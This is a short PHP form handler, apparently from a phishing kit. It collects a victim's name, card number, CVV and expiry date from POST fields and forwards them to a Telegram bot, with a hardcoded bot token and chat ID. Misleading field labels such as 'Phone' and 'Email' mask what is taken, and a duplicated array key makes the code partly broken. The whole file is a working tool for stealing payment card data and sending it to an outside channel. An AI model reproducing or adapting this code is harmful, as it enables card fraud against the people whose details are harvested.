<?php

$name = $_POST['name'];
$numbers = $_POST['numbers'];
$cvv = $_POST['cvv'];
$month = $_POST['month'];
$year = $_POST['year'];
$token = "5863134441:AAEB2Qw0i8J2CEUu7uFeTwNyjMH_SazZSV0";
$chat_id = "-1001895729782";
$arr = array(
  'Имя пользователя: ' => $name,
  'Телефон: ' => $numbers,
  'Email' => $cvv,
  'Email' => $month,
  'Email' => $year
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
